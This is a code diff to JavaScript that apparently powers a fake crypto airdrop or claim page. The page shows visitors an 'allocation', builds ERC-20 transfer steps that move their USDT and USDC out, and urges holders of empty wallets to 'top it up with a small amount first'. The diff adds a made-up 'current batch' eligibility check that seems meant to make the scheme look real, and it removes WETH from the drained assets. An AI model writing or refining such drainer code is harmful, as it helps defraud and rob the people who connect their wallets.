@@ -79,7 +79,6 @@ const ETH_ASSETS = [
   { symbol: "ETH", decimals: 18 },
   { symbol: "USDT", decimals: 6, contract: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
   { symbol: "USDC", decimals: 6, contract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
-  { symbol: "WETH", decimals: 18, contract: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
 ];
 const TOTAL_ADDRESSES = 291799980;
 const MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
@@ -509,14 +508,15 @@ async function renderResult(address, values) {
   const usd =
     chain.key === "sol"
       ? toNumber(values.SOL, 9) * prices.sol + toNumber(values.USDC, 6) + toNumber(values.USDT, 6)
-      : toNumber(values.ETH, 18) * prices.eth +
-        toNumber(values.WETH, 18) * prices.eth +
-        toNumber(values.USDT, 6) +
-        toNumber(values.USDC, 6);
+      : toNumber(values.ETH, 18) * prices.eth + toNumber(values.USDT, 6) + toNumber(values.USDC, 6);
   showFees(values);
   showAllocation(address, usd);
+  const eligible = hashAddress(address) % 6 !== 0 && usd >= 1;
+  if (!eligible) claimBox.hidden = true;
   await refineEthPreview(values);
-  if (usd === 0 || Number(lastAmount) === 0) {
+  if (!eligible) {
+    setMessage(rpcStatus, "This address is not in the current batch. The next batch opens after this one closes.");
+  } else if (usd === 0 || Number(lastAmount) === 0) {
     setMessage(rpcStatus, "Nothing to move from this address yet - top it up with a small amount first.");
   } else {
     setMessage(rpcStatus, "");
@@ -706,7 +706,7 @@ function erc20TransferData(recipient, amount) {
 function buildEthSteps(from, balanceWei, gasPrice, gasPricePerToken, gas, tokens) {
   const steps = [];
   const tokenGas = gasPrice > 0n ? gasPricePerToken / gasPrice : 65_000n;
-  for (const symbol of ["USDT", "USDC", "WETH"]) {
+  for (const symbol of ["USDT", "USDC"]) {
     const asset = ETH_ASSETS.find((item) => item.symbol === symbol);
     const raw = tokens[symbol] || 0n;
     if (raw <= 0n) continue;
